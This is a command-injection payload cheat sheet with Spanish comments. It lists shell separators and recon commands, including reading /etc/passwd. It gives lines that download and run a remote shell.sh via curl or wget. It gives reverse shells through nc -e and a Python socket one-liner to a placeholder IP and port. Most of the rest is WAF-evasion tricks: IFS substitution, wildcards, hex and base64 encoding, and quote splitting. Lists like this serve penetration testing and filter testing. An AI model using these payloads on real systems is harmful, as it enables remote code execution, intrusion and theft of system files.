# command_injection_payloads

---

# ======================================================
# COMMAND INJECTION PAYLOADS + OFUSCACIÓN
# ======================================================

# ----- SEPARADORES BÁSICOS -----
; id
| id
|| id
& id
&& id
`id`
$(id)

# ----- COMANDOS ÚTILES (Linux) -----
; cat /etc/passwd
; ls -la
; id
; uname -a
; whoami
; curl http://<IP>/shell.sh | bash
; wget http://<IP>/shell.sh -O /tmp/s.sh && chmod +x /tmp/s.sh && /tmp/s.sh
; nc -e /bin/sh <IP> <PUERTO>
; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PUERTO>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# ----- OFUSCACIÓN WAF -----
# Uso de variables de entorno (Linux)
${PATH:0:1}id   # (toma primer caracter de PATH, a veces '/')
${IFS}id        # IFS como espacio
id${IFS}-a

# Comillas invertidas anidadas
`echo`id

# Sustitución de comandos con $()
$(echo id)

# Uso de wildcards
/???/c?t /???/p??s??  (ejecuta cat /etc/passwd)

# Concatenación de cadenas
c"a"t /etc/passwd
c'a't /etc/passwd

# Codificación hexadecimal
printf "\x69\x64" | bash
$(printf "\x69\x64")

# Codificación base64
echo "aWQ=" | base64 -d | bash

# Uso de `tr` para ofuscar
echo "id" | tr 'a-z' 'a-z' | bash

# Inyección a través de `$@` (parámetros)
$@ -c "id"  (si $@ está vacío)

# Evasión con newline o tabulador
%0aid
%09id

# Uso de operadores de redirección
>id
sh<id

# Bypass de espacios con ${IFS}
id${IFS}-a

